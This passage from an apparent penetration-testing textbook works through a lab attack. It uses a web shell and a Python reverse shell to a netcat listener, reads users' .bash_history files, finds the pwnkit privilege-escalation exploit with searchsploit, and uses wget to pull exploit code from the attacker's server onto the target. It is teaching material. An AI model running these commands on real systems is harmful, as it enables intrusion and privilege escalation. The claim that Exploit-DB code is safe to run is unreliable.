     <span class="koboSpan" id="kobo.245.1">
      web page:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer137">
     <span class="koboSpan" id="kobo.246.1">
      <img alt="Figure 11.7 – An exploit proof-of-concept for the web shell" src="image/B22229_11_07.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.247.1">
     Figure 11.7 – An exploit proof-of-concept for the web shell
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.248.1">
     Next, we need to get a shell on the target system.
    </span>
    <span class="koboSpan" id="kobo.248.2">
     In your Kali terminal, enter
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.249.1">
      nc -nlvp 4444
     </span>
    </strong>
    <span class="koboSpan" id="kobo.250.1">
     and press the
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.251.1">
       Enter
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.252.1">
      key.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.253.1">
     Visit the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.254.1">
      Reverse Shell Cheat Sheet
     </span>
    </em>
    <span class="koboSpan" id="kobo.255.1">
     at
    </span>
    <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">
     <span class="koboSpan" id="kobo.256.1">
      https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
     </span>
    </a>
    <span class="koboSpan" id="kobo.257.1">
     .
    </span>
    <span class="koboSpan" id="kobo.257.2">
     We’re going to use the Python version.
    </span>
    <span class="koboSpan" id="kobo.257.3">
     Copy the code for the Python shell, then visit the CyberChef website at https://gchq.github.io/CyberChef/#recipe=URL_Encode(true) and paste the Python code into the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.258.1">
      Input
     </span>
    </strong>
    <span class="koboSpan" id="kobo.259.1">
     pane.
    </span>
    <span class="koboSpan" id="kobo.259.2">
     Change the Python command to be executed from
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.260.1">
      /bin/sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.261.1">
     to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.262.1">
      /bin/bash
     </span>
    </strong>
    <span class="koboSpan" id="kobo.263.1">
     .
    </span>
    <span class="koboSpan" id="kobo.263.2">
     Change the IP address and port to match what you’re using on your Kali system.
    </span>
    <span class="koboSpan" id="kobo.263.3">
     For the port, you can use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.264.1">
      4444
     </span>
    </strong>
    <span class="koboSpan" id="kobo.265.1">
     .
    </span>
    <span class="koboSpan" id="kobo.265.2">
     Click the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.266.1">
      Copy
     </span>
    </strong>
    <span class="koboSpan" id="kobo.267.1">
     button in the
    </span>
    <span class="No-Break">
     <strong class="bold">
      <span class="koboSpan" id="kobo.268.1">
       Output
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.269.1">
      pane.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.270.1">
     In your web browser where you have the target
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.271.1">
      shell.php
     </span>
    </strong>
    <span class="koboSpan" id="kobo.272.1">
     , paste in the Python code after
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.273.1">
      cmd=
     </span>
    </strong>
    <span class="koboSpan" id="kobo.274.1">
     , as shown in the following figure, then press the
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.275.1">
       Enter
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.276.1">
      key:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer138">
     <span class="koboSpan" id="kobo.277.1">
      <img alt="Figure 11.8 – Executing the Python payload in the web shell" src="image/B22229_11_08.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.278.1">
     Figure 11.8 – Executing the Python payload in the web shell
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.279.1">
     In your Kali
    </span>
    <a id="_idIndexMarker685">
    </a>
    <span class="koboSpan" id="kobo.280.1">
     terminal, you should see that you have a reverse shell connection, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.281.1">
      shown here:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer139">
     <span class="koboSpan" id="kobo.282.1">
      <img alt="Figure 11.9 – A reverse shell from the target system" src="image/B22229_11_09.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.283.1">
     Figure 11.9 – A reverse shell from the target system
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.284.1">
     Now that we have
    </span>
    <a id="_idIndexMarker686">
    </a>
    <span class="koboSpan" id="kobo.285.1">
     established our session, let’s move forward and start exploring the target in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.286.1">
      next section.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-183">
    <a id="_idTextAnchor329">
    </a>
    <span class="koboSpan" id="kobo.287.1">
     System information gathering
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.288.1">
     The first thing I
    </span>
    <a id="_idIndexMarker687">
    </a>
    <span class="koboSpan" id="kobo.289.1">
     want to know once I have a shell on a Linux system is whether I can run any commands using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.290.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.291.1">
     .
    </span>
    <span class="koboSpan" id="kobo.291.2">
     Enter the following command to check your
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.292.1">
       sudo
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.293.1">
      permissions:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.294.1">
$ sudo -l</span></pre>
   <p>
    <span class="koboSpan" id="kobo.295.1">
     Unfortunately, we’re prompted for a password on the target system.
    </span>
    <span class="koboSpan" id="kobo.295.2">
     Since we don’t know the password for this user account, this is a dead-end.
    </span>
    <span class="koboSpan" id="kobo.295.3">
     If we did know the password, we could enter it, and if we’re lucky, the command output would show that we could run a command with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.296.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.297.1">
     and possibly abuse it to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.298.1">
      escalate privileges.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.299.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.300.1">
     If you enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.301.1">
      sudo -l
     </span>
    </strong>
    <span class="koboSpan" id="kobo.302.1">
     command and get any output that shows you can run anything using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.303.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.304.1">
     , search for the command on the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.305.1">
      GTFOBins
     </span>
    </em>
    <span class="koboSpan" id="kobo.306.1">
     website (
    </span>
    <a href="https://gtfobins.github.io">
     <span class="koboSpan" id="kobo.307.1">
      https://gtfobins.github.io
     </span>
    </a>
    <span class="koboSpan" id="kobo.308.1">
     ) to see whether you can abuse it for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.309.1">
      privilege escalation.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.310.1">
     Let’s take a look around in the current directory,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.311.1">
      /var/www/html
     </span>
    </strong>
    <span class="koboSpan" id="kobo.312.1">
     .
    </span>
    <span class="koboSpan" id="kobo.312.2">
     We check to see whether the files in this directory contain any credentials.
    </span>
    <span class="koboSpan" id="kobo.312.3">
     However, we are not in luck, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.313.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer140">
     <span class="koboSpan" id="kobo.314.1">
      <img alt="Figure 11.10 – Examining files in the current working directory" src="image/B22229_11_10.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.315.1">
     Figure 11.10 – Examining files in the current working directory
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.316.1">
     Next, we take a look around in our home directory.
    </span>
    <span class="koboSpan" id="kobo.316.2">
     Use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.317.1">
      cat
     </span>
    </strong>
    <span class="koboSpan" id="kobo.318.1">
     command to examine any previous commands this user has previously entered using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.319.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.320.1">
$ cat /home/user6/.bash_history</span></pre>
   <p>
    <span class="koboSpan" id="kobo.321.1">
     While looking in our home directory, we do find an interesting bit of information, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.322.1">
      seen here:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer141">
     <span class="koboSpan" id="kobo.323.1">
      <img alt="Figure 11.11 – A file that indicates this user has sudo rights" src="image/B22229_11_11.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.324.1">
     Figure 11.11 – A file that indicates this user has sudo rights
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.325.1">
     The highlighted file indicates that this user has run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.326.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.327.1">
     command in the past.
    </span>
    <span class="koboSpan" id="kobo.327.2">
     Without knowing the user’s password, we cannot hope to run
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.328.1">
      sudo -l
     </span>
    </strong>
    <span class="koboSpan" id="kobo.329.1">
     to find out what they can run
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.330.1">
      using
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.331.1">
       sudo
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.332.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.333.1">
     Can we view any other user’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.334.1">
      .bash_history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.335.1">
     file?
    </span>
    <span class="koboSpan" id="kobo.335.2">
     Enter the following command to
    </span>
    <a id="_idTextAnchor330">
    </a>
    <a id="_idTextAnchor331">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.336.1">
      check this:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.337.1">
$ find /home -name .bash_history 2&gt;/dev/null -exec cat {} +</span></pre>
   <p>
    <span class="koboSpan" id="kobo.338.1">
     The preceding command runs the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.339.1">
      find
     </span>
    </strong>
    <span class="koboSpan" id="kobo.340.1">
     command on the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.341.1">
      /home
     </span>
    </strong>
    <span class="koboSpan" id="kobo.342.1">
     directory, looking for a filename (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.343.1">
      -name
     </span>
    </strong>
    <span class="koboSpan" id="kobo.344.1">
     ) of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.345.1">
      .bash_history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.346.1">
     .
    </span>
    <span class="koboSpan" id="kobo.346.2">
     Errors (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.347.1">
      file descriptor 2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.348.1">
     ) are sent to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.349.1">
      /dev/null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.350.1">
     , which results in them being discarded.
    </span>
    <span class="koboSpan" id="kobo.350.2">
     Any files matching this pattern are printed to the screen (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.351.1">
      -exec cat {} +
     </span>
    </strong>
    <span class="koboSpan" id="kobo.352.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.352.2">
     We get a lot more output than we saw when we looked at the current user’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.353.1">
      .bash_history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.354.1">
     file, but don’t find any credentials in command-line arguments in the output.
    </span>
    <span class="koboSpan" id="kobo.354.2">
     Still, it’s worth going back and examining the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.355.1">
      .bash_history
     </span>
    </strong>
    <span class="koboSpan" id="kobo.356.1">
     file in each user’s home directory and making a note of who’s running what command.
    </span>
    <span class="koboSpan" id="kobo.356.2">
     This information can often be useful once we have more information.
    </span>
    <span class="koboSpan" id="kobo.356.3">
     Since we have some level of access to various users’ home directories, make sure you take the time to explore these directories for any files containing
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.357.1">
      useful information.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.358.1">
     Next, let’s take a look
    </span>
    <a id="_idIndexMarker688">
    </a>
    <span class="koboSpan" id="kobo.359.1">
     at the system architecture and look for kernel exploits.
    </span>
    <span class="koboSpan" id="kobo.359.2">
     Understanding the system’s architecture, kernel version, and distribution helps identify potential vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.359.3">
     The following command prints
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.360.1">
      this information:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.361.1">
$ uname -a</span></pre>
   <p>
    <span class="koboSpan" id="kobo.362.1">
     The following screenshot shows this command output on the target system.
    </span>
    <span class="koboSpan" id="kobo.362.2">
     It reveals that the target system is running Ubuntu Linux, kernel version
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.363.1">
      4.15.0-45-generic
     </span>
    </strong>
    <span class="koboSpan" id="kobo.364.1">
     , and the architecture
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.365.1">
      is
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.366.1">
       x86_64
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.367.1">
      .
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer142">
     <span class="koboSpan" id="kobo.368.1">
      <img alt="Figure 11.12 – The command output shows essential information about the target operating system" src="image/B22229_11_12.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.369.1">
     Figure 11.12 – The command output shows essential information about the target operating system
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.370.1">
     To get specific operating system information, try the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.371.1">
      following commands:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.372.1">
$ cat /etc/lsb-release
$ cat /etc/os-release</span></pre>
   <p>
    <span class="koboSpan" id="kobo.373.1">
     The command output is shown on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.374.1">
      target system:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer143">
     <span class="koboSpan" id="kobo.375.1">
      <img alt="Figure 11.13 – Enumerating operating system release information" src="image/B22229_11_13.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.376.1">
     Figure 11.13 – Enumerating operating system release information
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.377.1">
     Next, let’s take
    </span>
    <a id="_idIndexMarker689">
    </a>
    <span class="koboSpan" id="kobo.378.1">
     the information that we have about the target operating system and kernel version and check for privilege escalation exploits.
    </span>
    <span class="koboSpan" id="kobo.378.2">
     In your Kali terminal, enter the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.379.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.380.1">
$ searchsploit -s "4.15" --id</span></pre>
   <p>
    <span class="koboSpan" id="kobo.381.1">
     Here is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.382.1">
      the explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.383.1">
       searchsploit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.384.1">
      : Allows you to search through exploits and shellcodes using one or more
     </span>
     <a id="_idIndexMarker690">
     </a>
     <span class="koboSpan" id="kobo.385.1">
      terms
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.386.1">
       from
      </span>
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.387.1">
        Exploit-DB
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.388.1">
       -s
      </span>
     </strong>
     <span class="koboSpan" id="kobo.389.1">
      :
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.390.1">
       Strict search
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.391.1">
       --id
      </span>
     </strong>
     <span class="koboSpan" id="kobo.392.1">
      : Displays the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.393.1">
       EDB-ID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.394.1">
      value rather than the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.395.1">
       local path
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.396.1">
     The output of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.397.1">
      searchsploit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.398.1">
     is shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.399.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer144">
     <span class="koboSpan" id="kobo.400.1">
      <img alt="Figure 11.14 – A demonstration of using searchsploit" src="image/B22229_11_14.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.401.1">
     Figure 11.14 – A demonstration of using searchsploit
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.402.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.403.1">
     I recommend that you explore the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.404.1">
      searchsploit
     </span>
    </strong>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.405.1">
      man
     </span>
    </strong>
    <span class="koboSpan" id="kobo.406.1">
     page.
    </span>
    <span class="koboSpan" id="kobo.406.2">
     There are some really useful features, such as the ability to examine (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.407.1">
      -x
     </span>
    </strong>
    <span class="koboSpan" id="kobo.408.1">
     ) the content, and mirror (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.409.1">
      -m
     </span>
    </strong>
    <span class="koboSpan" id="kobo.410.1">
     ) the exploit to the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.411.1">
      current directory.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.412.1">
     Based on the
    </span>
    <a id="_idIndexMarker691">
    </a>
    <span class="koboSpan" id="kobo.413.1">
     kernel version and knowledge that the target is running Ubuntu
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.414.1">
      18.04
     </span>
    </strong>
    <span class="koboSpan" id="kobo.415.1">
     , we should look into the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.416.1">
      polkit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.417.1">
     /
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.418.1">
      pwnkit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.419.1">
     exploits (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.420.1">
      CVE-2021-4034
     </span>
    </strong>
    <span class="koboSpan" id="kobo.421.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.421.2">
     This vulnerability was patched in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.422.1">
      polkit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.423.1">
     version
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.424.1">
      0.120
     </span>
    </strong>
    <span class="koboSpan" id="kobo.425.1">
     .
    </span>
    <span class="koboSpan" id="kobo.425.2">
     The following figure shows the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.426.1">
      searchsploit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.427.1">
     command output for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.428.1">
      this vulnerability:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer145">
     <span class="koboSpan" id="kobo.429.1">
      <img alt="Figure 11.15 – The searchsploit results for the polkit exploit" src="image/B22229_11_15.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.430.1">
     Figure 11.15 – The searchsploit results for the polkit exploit
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.431.1">
     We can enumerate the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.432.1">
      polkit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.433.1">
     version using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.434.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.435.1">
$ pkexec --version</span></pre>
   <p>
    <span class="koboSpan" id="kobo.436.1">
     The output shown in the following figure reveals that the target
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.437.1">
      polkit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.438.1">
     version
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.439.1">
      is vulnerable:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer146">
     <span class="koboSpan" id="kobo.440.1">
      <img alt="Figure 11.16 – The pkexec --version command reveals that the target is vulnerable" src="image/B22229_11_16.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.441.1">
     Figure 11.16 – The pkexec --version command reveals that the target is vulnerable
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.442.1">
     Before we attempt to exploit this, we check to ensure that the GCC compiler is installed using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.443.1">
      which gcc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.444.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.444.2">
     We find that it
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.445.1">
      is installed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.446.1">
     We run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.447.1">
      searchsploit -m 50689
     </span>
    </strong>
    <span class="koboSpan" id="kobo.448.1">
     command, which copies the exploit code to our current directory.
    </span>
    <span class="koboSpan" id="kobo.448.2">
     Examining the text of this file, we find that it contains code for two files,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.449.1">
      evil-so.c
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.450.1">
      and
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.451.1">
       exploit.c
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.452.1">
      .
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.453.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.454.1">
     Never blindly run exploit code and third-party scripts unless you first review the source code to verify that there’s nothing malicious in it that will exploit your or your customer’s system in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.455.1">
      unintended ways!
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.456.1">
     Since the source
    </span>
    <a id="_idIndexMarker692">
    </a>
    <span class="koboSpan" id="kobo.457.1">
     of this exploit code comes from
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.458.1">
      Exploit-DB
     </span>
    </em>
    <span class="koboSpan" id="kobo.459.1">
     (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.460.1">
      searchsploit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.461.1">
     ), it’s safe to use because
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.462.1">
      Offensive Security
     </span>
    </strong>
    <span class="koboSpan" id="kobo.463.1">
     reviews
    </span>
    <a id="_idIndexMarker693">
    </a>
    <span class="koboSpan" id="kobo.464.1">
     exploit submissions before they
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.465.1">
      are posted.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.466.1">
     We can transfer exploits and scripts over to the target system.
    </span>
    <span class="koboSpan" id="kobo.466.2">
     On the Kali system, make a new directory (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.467.1">
      mkdir
     </span>
    </strong>
    <span class="koboSpan" id="kobo.468.1">
     ) named
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.469.1">
      share
     </span>
    </strong>
    <span class="koboSpan" id="kobo.470.1">
     .
    </span>
    <span class="koboSpan" id="kobo.470.2">
     We never want to share our home directory or any location where we may have sensitive information to the network.
    </span>
    <span class="koboSpan" id="kobo.470.3">
     Change directory to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.471.1">
      share
     </span>
    </strong>
    <span class="koboSpan" id="kobo.472.1">
     (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.473.1">
      cd share
     </span>
    </strong>
    <span class="koboSpan" id="kobo.474.1">
     ), copy any exploits or scripts to this directory, then start a Python HTTP server as follows:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.475.1">
      python3 -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.476.1">
       m http.server
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.477.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.478.1">
     On the target system, change directory to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.479.1">
      /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.480.1">
     (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.481.1">
      cd /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.482.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.482.2">
     This directory is writable by all users.
    </span>
    <span class="koboSpan" id="kobo.482.3">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.483.1">
      /dev/shm
     </span>
    </strong>
    <span class="koboSpan" id="kobo.484.1">
     directory is also usually writable by all users.
    </span>
    <span class="koboSpan" id="kobo.484.2">
     Then, transfer the file from Kali using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.485.1">
      wget http://192.168.56.11:8000/filename
     </span>
    </strong>
    <span class="koboSpan" id="kobo.486.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.486.2">
     Of course, be sure to change the IP address and filename to values appropriate for your system.
    </span>
    <span class="koboSpan" id="kobo.486.3">
     Don’t forget to make your exploits or scripts executable (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.487.1">
      chmod +x
     </span>
    </strong>
    <span class="koboSpan" id="kobo.488.1">
     ) before you
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.489.1">
      run them!
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.490.1">
     On the target system, compile the exploits, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.491.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer147">
     <span class="koboSpan" id="kobo.492.1">
      <img alt="Figure 11.17 – Compiling the polkit exploit code" src="image/B22229_11_17.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.493.1">
     Figure 11.17 – Compiling the polkit exploit code
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.494.1">
     The output in the preceding figure is only warnings, and we check the files using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.495.1">
      ls -l
     </span>
    </strong>
